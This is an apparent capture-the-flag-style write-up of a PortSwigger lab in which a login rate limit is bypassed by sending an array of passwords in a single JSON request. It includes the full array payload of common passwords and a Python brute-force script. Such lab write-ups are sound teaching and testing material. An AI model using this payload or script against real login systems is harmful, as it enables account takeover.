# Broken Brute-Force Protection — Multiple Credentials Per Request

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Brute-force Carlos's password, then access his account page.

- Victim's username: `carlos`

---

## Lab

https://portswigger.net/web-security/authentication/other-mechanisms/lab-broken-brute-force-protection-multiple-credentials-per-request

---

## OWASP Category

A07:2021 – Identification and Authentication Failures

---

## Core Concept

This application uses **rate limiting** — too many login requests from the same IP in a short time triggers a block.

```
Rate limit logic:
IF requests_from_ip > limit IN time_window:
    BLOCK ip temporarily
```

The flaw: the limit counts **HTTP requests**, not **password attempts**. If the login endpoint accepts an **array of passwords in a single request**, we can test many passwords while only making ONE request — completely bypassing the rate limit.

```
Normal brute-force:
Request 1: password=guess1   ← counted as 1 request
Request 2: password=guess2   ← counted as 1 request
... (rate limited after a few)

Multiple credentials per request:
Request 1: password=[guess1,guess2,guess3,...,guess100]   ← still counted as 1 request!
```

If the backend processes an **array** and checks each value against the stored password, all 100 guesses are tested but only 1 HTTP request was made — the rate limiter never triggers.

---

## Steps to Solve

---

**Step 1 — Intercept the Login Request**

Submit a normal login attempt and intercept in ZAP:

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"carlos","password":"test123"}
```

<img width="706" height="371" alt="image" src="https://github.com/user-attachments/assets/6cb8d8b6-0f10-41e4-aa7a-fd528836cc49" />

---

**Step 2 — Confirm Rate Limiting Exists**

Send several requests with wrong passwords in quick succession:

```json
{"username":"carlos","password":"wrong1"}
{"username":"carlos","password":"wrong2"}
{"username":"carlos","password":"wrong3"}
```

After a few attempts:
```
"You have made too many incorrect login attempts. Please try again later."
```

<img width="1097" height="464" alt="image" src="https://github.com/user-attachments/assets/babf07e5-8f9c-4f52-9e4b-6fcf29543c3d" />

---

**Step 3 — Test Array-Based Password Submission**

Modify the JSON body to submit an **array of passwords** instead of a single string:

```json
{"username":"carlos","password":["wrong1","wrong2","wrong3"]}
```

Send this as **one single request**.

<img width="740" height="113" alt="image" src="https://github.com/user-attachments/assets/6057f48f-3511-41a5-830c-6412346a2dee" />

If the application does NOT reject this format and instead processes each value — response indicates one of the array entries was wrong (not a format error) — array processing is confirmed ✅

<img width="1667" height="330" alt="image" src="https://github.com/user-attachments/assets/259e144a-de0f-4574-a0e2-6e236fe18e43" />

---

**Step 4 — Build Full Password Array Payload**

Take the entire candidate passwords wordlist and submit it as **one array** in **one request**:

```json
{"username":"carlos","password":["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]}
```

<img width="892" height="253" alt="image" src="https://github.com/user-attachments/assets/3aa0deeb-a693-4b72-9d23-36ca37591050" />

---

**Lab Solved**

<img width="1523" height="720" alt="image" src="https://github.com/user-attachments/assets/f81420c5-bd89-4da1-aa79-75909a53453b" />

---

## Python Script — Build Array Payload

```python
import json
import requests

with open('candidate_passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f]

payload = {
    "username": "carlos",
    "password": passwords
}

r = requests.post(
    "https://lab-id.web-security-academy.net/login",
    json=payload
)

print(r.status_code)
print(r.text)
```

---

## How This Differs from Previous Labs

| | IP Block Lab | Account Lock Lab | This Lab |
|--|--|--|--|
| Protection type | IP-based blocking | Account locking | **Request rate limiting** |
| Flaw | Counter resets on success | Lock message leaks validity | **Limit counts requests, not attempts** |
| Bypass method | Interleave own login | Multiple lock attempts | **Array of passwords in one request** |
| Requests needed | Many (interleaved) | Many (4 per username) | **One single request** |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
